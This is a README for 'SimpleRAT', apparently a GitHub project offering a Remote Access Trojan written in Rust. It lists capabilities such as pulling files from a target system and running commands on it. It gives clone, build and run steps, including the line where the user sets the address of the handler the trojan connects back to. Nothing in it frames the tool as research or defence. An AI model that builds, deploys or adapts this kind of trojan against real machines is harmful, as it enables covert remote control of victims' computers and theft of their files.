SimpleRAT is a basic Remote Access Trojan (RAT) written in Rust. It allows for remote control and file transfer capabilities, designed to be used in conjunction with the [ReverseShellHandler](https://github.com/Jirka5091/ReverseShellHandler).

## Features

- üìÅ File transfer from target system to handler
- üìú Execute system commands on the target machine
- üì° Connects to ReverseShellHandler for managing sessions

## Installation

To build and run SimpleRAT, ensure you have Rust installed. Then, follow these steps:

```bash
git clone https://github.com/Jirka5091/SimpleRAT
cd SimpleRAT
# Edit the main.rs file to set the handler IP and port
nano src/main.rs
cargo build --release
```

In `main.rs`, set the handler IP and port:

```rust
let mut stream = TcpStream::connect("127.0.0.1:8080")
```

## Usage

To start the SimpleRAT, use the following command:

```bash
./target/release/simple_rat
```

## Integration with ReverseShellHandler

SimpleRAT is intended to be used with the [ReverseShellHandler](https://github.com/Jirka5091/ReverseShellHandler). Ensure the handler is running and listening on the specified IP and port before starting SimpleRAT.
